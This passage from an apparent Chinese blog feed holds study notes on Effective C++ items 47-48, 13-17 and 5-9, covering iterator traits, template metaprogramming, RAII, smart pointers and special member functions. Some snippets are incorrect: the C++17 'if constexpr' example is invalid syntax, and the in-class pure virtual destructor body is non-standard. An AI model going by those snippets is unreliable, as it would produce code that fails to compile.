class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">doAdvance</span><span class="hljs-params">(IterT&amp; iter, DisT d, std::random_access_iterator_tag)</span> </span>{    iter +=d;}   <span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> IterT, <span class="hljs-keyword">typename</span> DisT&gt;</span><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">doAdvance</span><span class="hljs-params">(IterT&amp; iter, DisT d, std::bidirectional_iterator_tag)</span> </span>{    <span class="hljs-keyword">if</span>(d&gt;=<span class="hljs-number">0</span>) { <span class="hljs-keyword">while</span>(d--) ++iter; }     <span class="hljs-keyword">else</span> { <span class="hljs-keyword">while</span> (d++) --iter; }}<span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> IterT, <span class="hljs-keyword">typename</span> DisT&gt;</span><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">doAdvance</span><span class="hljs-params">(IterT&amp; iter, DisT d, std::input_iterator_tag)</span> </span>{  <span class="hljs-comment">// input 迭代器和 forward 迭代器都适用</span>    <span class="hljs-keyword">if</span> (d &lt; <span class="hljs-number">0</span>) {        <span class="hljs-keyword">throw</span> std::<span class="hljs-built_in">out_of_range</span>(<span class="hljs-string">"Negative distance"</span>);       <span class="hljs-comment">// 单向迭代器不允许负距离</span>    }    <span class="hljs-keyword">while</span> (d--)++iter;}<span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> IterT, <span class="hljs-keyword">typename</span> DisT&gt;</span><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">advance</span><span class="hljs-params">(IterT&amp; iter, DisT d)</span> </span>{    <span class="hljs-built_in">doAdvance</span>(iter, d, std::iterator_traits&lt;IterT&gt;::<span class="hljs-built_in">iterator_category</span>());}</code></pre></div></div><p>在 C++17之后，我们有了更简单有效的做法——使用<code>if constexpr</code>：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ls0nuulmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-ls0nuulmso36dk"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> IterT, <span class="hljs-keyword">typename</span> DisT&gt;</span><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Advance</span><span class="hljs-params">(IterT&amp; iter, DisT d)</span> </span>{    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">constexpr</span> (<span class="hljs-built_in">typeid</span>(std::iterator_traits&lt;IterT&gt;::iterator_category)        == <span class="hljs-built_in">typeid</span>(std::random_access_iterator_tag)) {        ...    }}</code></pre></div></div><h3 id="条款-48认识模板元编程">条款 48：认识模板元编程</h3><p>模板元编程（Template metaprogramming，TMP）是编写基于模板的 C++程序并执行于编译期的过程，它并不是刻意被设计出来的，而是当初 C++引入模板带来的副产品，事实证明模板元编程具有强大的作用，并且现在已经成为C++ 标准的一部分。实际上，在条款 47 中编写 traits classes时，我们就已经在进行模板元编程了。</p><p>由于模板元程序执行于 C++编译期，因此可以将一些工作从运行期转移至编译期，这可以帮助我们在编译期时发现一些原本要在运行期时才能察觉的错误，以及得到较小的可执行文件、较短的运行期、较少的内存需求。当然，副作用就是会使编译时间变长。</p><p>模板元编程已被证明是“图灵完备”的，并且以“函数式语言”的形式发挥作用，因此在模板元编程中没有真正意义上的循环，所有循环效果只能藉由递归实现，而递归在模板元编程中是由<strong>“递归模板具现化（recursive template instantiation）”</strong>实现的。</p><p>常用于引入模板元编程的例子是在编译期计算阶乘：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-x9zvn6lmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-x9zvn6lmso36dk"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-type">unsigned</span> n&gt;            <span class="hljs-comment">// Factorial&lt;n&gt; = n * Factorial&lt;n-1&gt;</span><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Factorial</span> {    <span class="hljs-keyword">enum</span> { value = n * Factorial&lt;n<span class="hljs-number">-1</span>&gt;::value }; <span class="hljs-comment">//enum hack，见条款2</span>};<span class="hljs-keyword">template</span>&lt;&gt; <span class="hljs-comment">//特殊情况，使用全特化实现</span><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Factorial</span>&lt;<span class="hljs-number">0</span>&gt; {           <span class="hljs-comment">// 处理特殊情况：Factorial&lt;0&gt; = 1</span>    <span class="hljs-keyword">enum</span> { value = <span class="hljs-number">1</span> };};<span class="hljs-comment">//怎么用</span>std::cout &lt;&lt; Factorial&lt;<span class="hljs-number">5</span>&gt;::value;</code></pre></div></div><p>模板元编程很酷，<strong>但对其进行调试可能是灾难性的</strong>，因此在实际应用中并不常见。</p><p>作者提出，我们可能会在下面几种情形中见到它的出场：</p><ol type="1"><li><p>确保量度单位正确，用于早期错误侦测。</p><blockquote><p>我们知道，越早发现错误越好。</p></blockquote></li><li><p>优化矩阵计算。</p><blockquote><p>不过，并行计算才是正道。</p></blockquote></li><li><p>可以进行代码生成。</p><blockquote><p>除了基础库以外暂时还没见过实例，可能是眼界太狭隘了。</p></blockquote></li></ol>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>EffectiveC++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Effective C++ - Item13-17 - 资源管理</title>
    <link href="/posts/30855/"/>
    <url>/posts/30855/</url>
    
    <content type="html"><![CDATA[<h1 id="effective-c---item13-17---资源管理">Effective C++ - Item13-17 -资源管理</h1><h3 id="总览">总览</h3><p>这一模块的内容是在完整阅读《Effective C++》的基础上，参考了<a href="https://www.zhihu.com/people/96-61-29-67">缪之灵</a>大佬的<a href="https://zhuanlan.zhihu.com/p/613356779">一篇文章学完 EffectiveC++：条款 &amp; 实践</a>进行总结。虽然<a href="https://www.zhihu.com/people/96-61-29-67">缪之灵</a>大佬的文章将最重要的部分总结的非常到位，但在此结合自己的理解和编程实践对其进行补充，并订正一些错误，以方便自己后续总结回顾，同时在尽可能保持简洁的前提下提高可读性。虽然原书有些地方写的比较拖沓，但作为经典的C++参考书，想要了解更多的细节，还是值得仔细去阅读的。</p><p>同时，假定阅读文章时对C++已经具有本科高级语言程序设计课程内容的理解水平。大部分情况下，除非它很重要，不会对C++基础的语法特性进行介绍。</p><p>本部分是第三章内容，对<strong>条款13-17</strong>进行介绍。</p><p>资源管理是编写C++代码相比编写其他高级语言代码时所需要更加留心的。C++有强大的操纵资源的能力和性能的同时，也留给我们更多的心智负担去思考如何管理资源。这是我们享受性能裨益的同时要担负的责任。</p><p>很多新兴语言如Rust正尝试通过更明确的语言级别限制来尽可能容易的写出安全的代码，但理解在C++下如何防止资源泄漏，并养成良好的防范意识，这种能力是一通百通的。本部分主要的核心内容是<strong>基于对象的资源管理</strong>，从现代C++的视角看其实现便是<strong>智能指针</strong>。经验显示，经过训练后严守这些做法，可以几乎消除资源管理问题。</p><h3 id="条款-13以对象管理资源">条款 13：以对象管理资源</h3><p>对于传统的堆资源管理，我们需要使用成对的<code>new</code>和<code>delete</code>，这样若忘记<code>delete</code>就会造成内存泄漏。</p><blockquote><p>比如，在delete之前过早的return掉函数。</p></blockquote><p>因此，我们应尽可能以对象管理资源，并采用RAII（Resource Acquisition IsInitialization，资源取得时机便是初始化时机），让<strong>析构函数负责资源的释放</strong>。</p><p>原书此处关于智能指针的内容已经过时，在 C++11中，通过专一所有权来管理RAII对象可以使用<code>std::unique_ptr</code>，通过引用计数来管理RAII对象可以使用<code>std::shared_ptr</code>。</p><blockquote><p>引用计数型能指针 (reference--counting smart pointer RCSP)</p></blockquote><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ug2p1tlmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-ug2p1tlmso36dk"><pre><code class="hljs cpp"><span class="hljs-comment">// Investment* CreateInvestment();</span><span class="hljs-function">std::unique_ptr&lt;Investment&gt; <span class="hljs-title">pUniqueInv1</span><span class="hljs-params">(CreateInvestment())</span></span>;<span class="hljs-function">std::unique_ptr&lt;Investment&gt; <span class="hljs-title">pUniqueInv2</span><span class="hljs-params">(std::move(pUniqueInv1))</span></span>;    <span class="hljs-comment">// 转移资源所有权</span><span class="hljs-function">std::shared_ptr&lt;Investment&gt; <span class="hljs-title">pSharedInv1</span><span class="hljs-params">(CreateInvestment())</span></span>;<span class="hljs-function">std::shared_ptr&lt;Investment&gt; <span class="hljs-title">pSharedInv2</span><span class="hljs-params">(pSharedInv1)</span></span>;               <span class="hljs-comment">// 引用计数+1</span></code></pre></div></div><p>智能指针默认会自动delete所持有的对象，我们也可以为智能指针指定所管理对象的释放方式（删除器deleter）：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-43edq6lmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-43edq6lmso36dk"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">GetRidOfInvestment</span><span class="hljs-params">(Investment*)</span> </span>{ std::cout&lt;&lt;<span class="hljs-string">"Clean up"</span>;}<span class="hljs-function">std::unique_ptr&lt;Investment, <span class="hljs-title">decltype</span><span class="hljs-params">(GetRidOfInvestment)</span>*&gt; <span class="hljs-title">pUniqueInv</span><span class="hljs-params">(CreateInvestment(), GetRidOfInvestment)</span></span>;<span class="hljs-function">std::shared_ptr&lt;Investment&gt; <span class="hljs-title">pSharedInv</span><span class="hljs-params">(CreateInvestment(), GetRidOfInvestment)</span></span>;</code></pre></div></div><h3 id="条款-14在资源管理类中小心拷贝行为">条款14：在资源管理类中小心拷贝行为</h3><p>我们应该永远保持这样的思考：当一个RAII对象被复制，会发生什么事？</p><blockquote><p>比如，我们将C API的互斥锁包装成RAII对象，它显然不应该被复制。</p></blockquote><p><strong>选择一：禁止复制</strong></p><p>许多时候允许RAII对象被复制并不合理，如果确是如此，那么就该明确禁止复制行为，条款6 已经阐述了怎么做这件事。</p><blockquote><p>拷贝构造函数和拷贝复值运算符声明为private或者=delete</p></blockquote><p><strong>选择二：对底层资源祭出“引用计数法”</strong></p><p>正如<code>std::shared_ptr</code>所做的那样，每一次复制对象就使引用计数+1，每一个对象离开定义域就调用析构函数使引用计数-1，直到引用计数为0就彻底销毁资源。</p><p><strong>选择三：复制底层资源</strong></p><p>在复制对象的同时复制底层资源的行为又被称作<strong>深拷贝（Deepcopying）</strong>，例如在一个对象中有一个指针，那么在复制这个对象时就不能只复制指针，也要复制指针所指向的数据。</p><p><strong>选择四：转移底层资源的所有权</strong></p><p>和<code>std::unique_ptr</code>的行为类似，永远保持只有一个对象拥有对资源的管理权，当需要复制对象时转移资源的管理权。</p><h3 id="条款-15在资源管理类中提供对原始资源的访问">条款15：在资源管理类中提供对原始资源的访问</h3><p>和所有的智能指针一样，STL中的智能指针也提供了对原始资源的隐式访问和显式访问：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-fwtouslmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-fwtouslmso36dk"><pre><code class="hljs cpp">Investment* pRaw = pSharedInv.<span class="hljs-built_in">get</span>();    <span class="hljs-comment">// 显式访问原始资源</span>Investment raw = *pSharedInv;           <span class="hljs-comment">// 隐式访问原始资源</span></code></pre></div></div><blockquote><p>智能指针针重载了指针取值操作符(operator-&gt;和operator*)，它们允许使用指针的方式操作资源，也可以隐式转换至底部原始指针。</p></blockquote><p>当我们在设计自己的资源管理类时，也要考虑在提供对原始资源的访问时，是使用显式访问还是隐式访问的方法，还是两者皆可。</p><blockquote><p>下面的例子是将字体包装成RAII对象，同时考虑CAPI的兼容性，考虑转换为原始资源<code>FontHandle</code>的需求。</p></blockquote><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-15g9o3lmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-15g9o3lmso36dk"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Font</span> {<span class="hljs-keyword">public</span>:    <span class="hljs-function">FontHandle <span class="hljs-title">Get</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>{ <span class="hljs-keyword">return</span> handle; }       <span class="hljs-comment">// 显式转换函数</span>    <span class="hljs-function"><span class="hljs-keyword">operator</span> <span class="hljs-title">FontHandle</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>{ <span class="hljs-keyword">return</span> handle; }  <span class="hljs-comment">// 隐式转换函数</span><span class="hljs-keyword">private</span>:    FontHandle handle;};</code></pre></div></div><blockquote><p>注：这里是重载了强制类型转换的括号运算符。</p></blockquote><p>一般而言显式转换比较安全，但隐式转换对客户比较方便。</p><blockquote><p>就像多数设计良好的classes一样，它隐藏了客户不需要看的部分，但备妥客户需要的所有东西。</p></blockquote><h3 id="条款-16成对使用-new-和-delete-时要采用相同形式">条款16：成对使用 new 和 delete 时要采用相同形式</h3><p>使用<code>new</code>来分配单一对象，使用<code>new[]</code>来分配对象数组，必须明确它们的行为并不一致，分配对象数组时会额外在内存中记录“数组大小”，而使用<code>delete[]</code>会根据记录的数组大小多次调用析构函数，使用<code>delete</code>则仅仅只会调用一次析构函数。对于单一对象使用<code>delete[]</code>其结果也是未定义的，程序可能会读取若干内存并将其错误地解释为数组大小。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-o5pc8hlmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-o5pc8hlmso36dk"><pre><code class="hljs cpp"><span class="hljs-type">int</span>* array = <span class="hljs-keyword">new</span> <span class="hljs-type">int</span>[<span class="hljs-number">10</span>];<span class="hljs-type">int</span>* object = <span class="hljs-keyword">new</span> <span class="hljs-type">int</span>;<span class="hljs-keyword">delete</span>[] array;<span class="hljs-keyword">delete</span> object;</code></pre></div></div><p>需要注意的是，使用<code>typedef</code>定义数组类型会带来额外的风险：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ylw30slmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-ylw30slmso36dk"><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> std::string AddressLines[<span class="hljs-number">4</span>];std::string* pal = <span class="hljs-keyword">new</span> AddressLines;    <span class="hljs-comment">// pal 是一个对象数组，而非单一对象</span><span class="hljs-comment">//用户后续可能忘记它是个数组</span><span class="hljs-keyword">delete</span> pal;                             <span class="hljs-comment">// 行为未定义</span><span class="hljs-keyword">delete</span>[] pal;                           <span class="hljs-comment">// 正确</span></code></pre></div></div><h3 id="条款-17以独立语句将-newed-对象置入智能指针">条款17：以独立语句将 newed 对象置入智能指针</h3><p>现在更好的做法是使用<code>std::make_unique</code>和<code>std::make_shared</code>：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-843s98lmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-843s98lmso36dk"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> pUniqueInv = std::<span class="hljs-built_in">make_unique</span>&lt;Investment&gt;();    <span class="hljs-comment">// since C++14</span><span class="hljs-keyword">auto</span> pSharedInv = std::<span class="hljs-built_in">make_shared</span>&lt;Investment&gt;();    <span class="hljs-comment">// since C++11</span></code></pre></div></div><blockquote><p>原文中举了这样的例子：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-we4fzllmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-we4fzllmso36dk"><pre><code class="hljs cpp"><span class="hljs-built_in">processwidget</span>(std::<span class="hljs-built_in">shared_ptr</span>&lt;Widget&gt;(<span class="hljs-keyword">new</span> Widget),<span class="hljs-built_in">priority</span>());</code></pre></div></div><p>认为<code>priority()</code>的执行异常可能导致<code>Widget</code>未被置于智能指针中，从而引发资源泄漏。</p><p>函数入参的表达式计算顺序本身就是未定义的，不同编译器的执行结果可能是不同的：</p><p>如：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-aclcy4lmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-aclcy4lmso36dk"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dis</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b,<span class="hljs-type">int</span> c)</span></span><span class="hljs-function"></span>{ cout&lt;&lt;a&lt;&lt;<span class="hljs-string">' '</span>&lt;&lt;b&lt;&lt;<span class="hljs-string">' '</span>&lt;&lt;c;}<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{ <span class="hljs-type">int</span> x = <span class="hljs-number">0</span>; <span class="hljs-built_in">dis</span>(x++, x++,x); <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre></div></div><p>clang-tidy会报： </p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-nr1u9almso36dk"></i><span>llvm</span><div class="collapse show" id="collapse-nr1u9almso36dk"><pre><code class="hljs llvm">Multiple unsequenced modifications <span class="hljs-keyword">to</span> ’<span class="hljs-keyword">x</span>'</code></pre></div></div><p></p><p><strong>因此，不要这么写。</strong></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>EffectiveC++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Effective C++ - Item5-12 - 构造/析构/赋值运算</title>
    <link href="/posts/42906/"/>
    <url>/posts/42906/</url>
    
    <content type="html"><![CDATA[<h1 id="effective-c---item5-12---构造析构赋值运算">Effective C++ -Item5-12 - 构造/析构/赋值运算</h1><h3 id="总览">总览</h3><p>这一模块的内容是在完整阅读《Effective C++》的基础上，参考了<a href="https://www.zhihu.com/people/96-61-29-67">缪之灵</a>大佬的<a href="https://zhuanlan.zhihu.com/p/613356779">一篇文章学完 EffectiveC++：条款 &amp; 实践</a>进行总结。虽然<a href="https://www.zhihu.com/people/96-61-29-67">缪之灵</a>大佬的文章将最重要的部分总结的非常到位，但在此结合自己的理解和编程实践对其进行补充，并订正一些错误，以方便自己后续总结回顾，同时在尽可能保持简洁的前提下提高可读性。虽然原书有些地方写的比较拖沓，但作为经典的C++参考书，想要了解更多的细节，还是值得仔细去阅读的。</p><p>同时，假定阅读文章时对C++已经具有本科高级语言程序设计课程内容的理解水平。大部分情况下，除非它很重要，不会对C++基础的语法特性进行介绍。</p><p>本部分是第二章内容，对<strong>条款5-12</strong>进行介绍。</p><p>构造/析构/赋值运算是C++面向对象编程中最常打交道的内容，必须要良好的定义它们。</p><h3 id="条款-5了解-c-默默编写并调用哪些函数">条款 5：了解 C++默默编写并调用哪些函数</h3><p>C++ 中的空类并不是真正意义上的空类，编译器会为它预留以下内容：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-61nqxklmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-61nqxklmso36dk"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Empty</span> {<span class="hljs-keyword">public</span>:    <span class="hljs-built_in">Empty</span>() { ... }                           <span class="hljs-comment">// 默认构造函数（没有任何构造函数时）</span>    <span class="hljs-built_in">Empty</span>(<span class="hljs-type">const</span> Empty&amp;) { ... }               <span class="hljs-comment">// 拷贝构造函数</span>    <span class="hljs-built_in">Empty</span>(Empty&amp;&amp;) { ... }                    <span class="hljs-comment">// 移动构造函数 (since C++11)</span>    ~<span class="hljs-built_in">Empty</span>() { ... }                          <span class="hljs-comment">// 析构函数</span>        Empty&amp; <span class="hljs-keyword">operator</span>=(<span class="hljs-type">const</span> Empty&amp;) { ... }    <span class="hljs-comment">// 拷贝赋值运算符</span>    Empty&amp; <span class="hljs-keyword">operator</span>=(Empty&amp;&amp;) { ... }         <span class="hljs-comment">// 移动赋值运算符 (since C++11)</span>};</code></pre></div></div><p>唯有当这些函数被调用时，它们才会真正被编译器创建出来，下面代码将造成上述每一个函数被创建：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-7r2jqwlmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-7r2jqwlmso36dk"><pre><code class="hljs cpp">Empty e1;                   <span class="hljs-comment">// 默认构造函数 &amp; 析构函数</span><span class="hljs-function">Empty <span class="hljs-title">e2</span><span class="hljs-params">(e1)</span></span>;               <span class="hljs-comment">// 拷贝构造函数</span>Empty e3 = std::<span class="hljs-built_in">move</span>(e2);   <span class="hljs-comment">// 移动构造函数 (since C++11)</span>e2 = e1;                    <span class="hljs-comment">// 拷贝赋值运算符</span>e3 = std::<span class="hljs-built_in">move</span>(e1);         <span class="hljs-comment">// 移动赋值运算符 (since C++11)</span></code></pre></div></div><p>需要注意的是，拷贝赋值运算符只有在允许存在时才会自动创建，比如以下情况：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-pdc1dnlmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-pdc1dnlmso36dk"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">NamedObject</span> {<span class="hljs-keyword">private</span>:    std::string&amp; nameValue;};</code></pre></div></div><p>在该类中，我们有一个string引用类型，然而引用无法指向不同对象，因此编译器会拒绝为该类创建一个默认的拷贝赋值运算符。</p><p>除此之外，以下情形也会导致拷贝赋值运算符不会自动创建：</p><ol type="1"><li>类中含有const成员。</li><li>基类中含有private的拷贝赋值运算符。</li></ol><blockquote><p>关于这一点，别忘了在高级语言程序设计中早已学过的：如果一个对象内有指针存储的数据成员，拷贝时一定要再new一个，否则可能会出现多次delete同一块内存的情况。条款10讲了怎么在复制时保证异常安全。</p></blockquote><h3 id="条款-6若不想使用编译器自动生成的函数就该明确拒绝">条款6：若不想使用编译器自动生成的函数，就该明确拒绝</h3><p>原书中使用的做法是将不想使用的函数声明为private，或者更进一步的，专门定义一个<code>Uncopyable</code>对象，它的copy构造函数和copyassignment操作符是private的，让不想被拷贝的对象继承它。</p><p>但在 C++11 后我们有了更好的做法：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-5eyjb2lmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-5eyjb2lmso36dk"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Uncopyable</span> {<span class="hljs-keyword">public</span>:    <span class="hljs-built_in">Uncopyable</span>(<span class="hljs-type">const</span> Uncopyable&amp;) = <span class="hljs-keyword">delete</span>;    Uncopyable&amp; <span class="hljs-keyword">operator</span>=(<span class="hljs-type">const</span> Uncopyable&amp;) = <span class="hljs-keyword">delete</span>;};</code></pre></div></div><h3 id="条款-7为多态基类声明虚析构函数">条款7：为多态基类声明虚析构函数</h3><p>当派生类对象经由一个基类指针被删除，而该<strong>基类指针带着一个非虚析构函数</strong>，其结果是未定义的，可能会<strong>无法完全销毁派生类的成员，造成内存泄漏</strong>(因为调用的是基类的析构函数）。消除这个问题的方法就是对基类使用虚析构函数：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-jiolr1lmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-jiolr1lmso36dk"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Base</span> {<span class="hljs-keyword">public</span>:    <span class="hljs-built_in">Base</span>();    <span class="hljs-keyword">virtual</span> ~<span class="hljs-built_in">Base</span>();};</code></pre></div></div><p>如果你不想让一个类成为基类，那么在类中声明虚函数是是一个坏主意，因为额外存储的虚表指针会使类的体积变大。</p><blockquote><p>并非所有base classes的设计目的都是为了多态用途。例如标准string和STL容器都不被设计作为baseclasses使用，更别提多态了。它们都没有虚析构函数，所以<strong>不要继承它们</strong>。</p><p>某些classes的设计目的是作为baseclasses使用，但不是为了多态用途。它们也不需要虚析构函数。</p></blockquote><p>虚析构函数的运作方式是，最深层派生的那个类的析构函数最先被调用，然后是其上的基类的析构函数被依次调用。</p><p>如果你想将基类作为抽象类使用，但手头上又没有别的虚函数，那么将它的析构函数设为纯虚函数是一个不错的想法。考虑以下情形：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-3fme8qlmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-3fme8qlmso36dk"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Base</span> {<span class="hljs-keyword">public</span>:    <span class="hljs-keyword">virtual</span> ~<span class="hljs-built_in">Base</span>() = <span class="hljs-number">0</span>;};</code></pre></div></div><p>但若此时从该基类中派生出新的类，会发生报错，这是因为编译器无法找到基类的析构函数的实现。因此，即使是纯虚析构函数，也需要一个函数体：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-e0z6bslmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-e0z6bslmso36dk"><pre><code class="hljs cpp">Base::~<span class="hljs-built_in">Base</span>() {}</code></pre></div></div><p>或者以下写法也被允许：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-8anfsplmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-8anfsplmso36dk"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Base</span> {<span class="hljs-keyword">public</span>:    <span class="hljs-keyword">virtual</span> ~<span class="hljs-built_in">Base</span>() = <span class="hljs-number">0</span> {}};</code></pre></div></div><h3 id="条款-8别让异常逃离析构函数">条款 8：别让异常逃离析构函数</h3><p>在析构函数中吐出异常并不被禁止，但为了程序的可靠性，应当极力避免这种行为。</p><p>为了实现RAII，我们通常会将对象的销毁方法封装在析构函数中，如下例子：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-zp366flmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-zp366flmso36dk"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">DBConn</span> {<span class="hljs-keyword">public</span>:    ...    ~<span class="hljs-built_in">DBConn</span>() {        db.<span class="hljs-built_in">close</span>();    <span class="hljs-comment">// 该函数可能会抛出异常</span>    }<span class="hljs-keyword">private</span>:    DBConnection db;};</code></pre></div></div><p>但这样我们就需要在析构函数中完成对异常的处理，以下是几种常见的做法：</p><p>第一种：杀死程序：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-zb55iglmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-zb55iglmso36dk"><pre><code class="hljs cpp">DBConn::~<span class="hljs-built_in">DBConn</span>() {    <span class="hljs-keyword">try</span> { db.<span class="hljs-built_in">close</span>(); }    <span class="hljs-built_in">catch</span> (...) {        <span class="hljs-comment">// 记录运行日志，以便调试</span>        std::<span class="hljs-built_in">abort</span>();    }}</code></pre></div></div><p>第二种：直接吞下异常不做处理，但这种做法不被建议。</p><p>第三种：重新设计接口，将异常的处理交给客户端完成：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-uegze7lmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-uegze7lmso36dk"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">DBConn</span> {<span class="hljs-keyword">public</span>:    ...    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">close</span><span class="hljs-params">()</span> </span>{        db.<span class="hljs-built_in">close</span>();        closed = <span class="hljs-literal">true</span>;    }    ~<span class="hljs-built_in">DBConn</span>() {        <span class="hljs-keyword">if</span> (!closed) {            <span class="hljs-keyword">try</span> {                db.<span class="hljs-built_in">close</span>();            }            <span class="hljs-built_in">catch</span>(...) {                <span class="hljs-comment">// 处理异常</span>            }        }    }<span class="hljs-keyword">private</span>:    DBConnection db;    <span class="hljs-type">bool</span> closed;};</code></pre></div></div><p>在这个新设计的接口中，我们提供了<code>close</code>函数供客户手动调用，这样客户也可以根据自己的意愿处理异常；若客户忘记手动调用，析构函数才会自动调用<code>close</code>函数。</p><p>当一个操作可能会抛出需要客户处理的异常时，将其暴露在普通函数而非析构函数中是一个更好的选择。</p><h3 id="条款-9绝不在构造和析构过程中调用虚函数">条款9：绝不在构造和析构过程中调用虚函数</h3><p>在创建派生类对象时，基类的构造函数永远会早于派生类的构造函数被调用，而基类的析构函数永远会晚于派生类的析构函数被调用。</p><p>在派生类对象的基类构造和析构期间，对象的类型是基类而非派生类，因此<strong>此时调用虚函数会被编译器解析至基类的虚函数版本</strong>，通常不会得到我们想要的结果。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-uyu3zjlmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-uyu3zjlmso36dk"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Transaction</span> {<span class="hljs-keyword">public</span>:    <span class="hljs-built_in">Transaction</span>(); <span class="hljs-comment">//所有交易的base class</span>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span 